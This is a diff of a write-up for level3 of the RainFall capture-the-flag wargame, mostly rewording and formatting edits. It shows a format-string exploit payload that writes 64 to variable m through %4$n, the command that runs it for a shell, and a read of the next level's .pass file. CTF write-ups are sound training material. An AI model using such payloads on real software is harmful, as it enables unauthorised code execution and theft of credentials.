@@ -53,7 +53,7 @@ AAAA 200 b7fd1ac0 b7ff37d0 41414141
 
 In this output, 41414141, the hexadecimal representation of 'AAAA', is found at the fourth position.
 
-The assembly code reveals that the address of the m variable is 0x804988c.
+The assembly code reveals that the address of the `m` variable is `0x804988c`.
 
 We can then craft our payload:
 ```
@@ -62,12 +62,12 @@ address of m + padding + %n format specifier pointing to the fourth argument
 "\x8c\x98\x04\x08" + "0"*(64-4) + "%4$n"
 
 Since we need to write 64 into m, we write 64 characters (4 from the address of m and 60 from the "0" padding). 
-Then, we employ the %n format specifier to record the count of bytes written so far into the fourth argument, which is m's address.
+Then, we use the %n format specifier to record the count of bytes written so far into the fourth argument, which is m's address.
 ```
 
 Let's execute our payload:
 ```bash
-level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08" + "0"*(64-4) + "%4$n")' && cat) | ./level3
+level3@RainFall:~$ (python -c 'print("\x08\x04\x98\x8c"[::-1] + "0"*(64-4) + "%4$n")' && cat) | ./level3
 �000000000000000000000000000000000000000000000000000000000000
 Wait what?!
 cat /home/user/level4/.pass
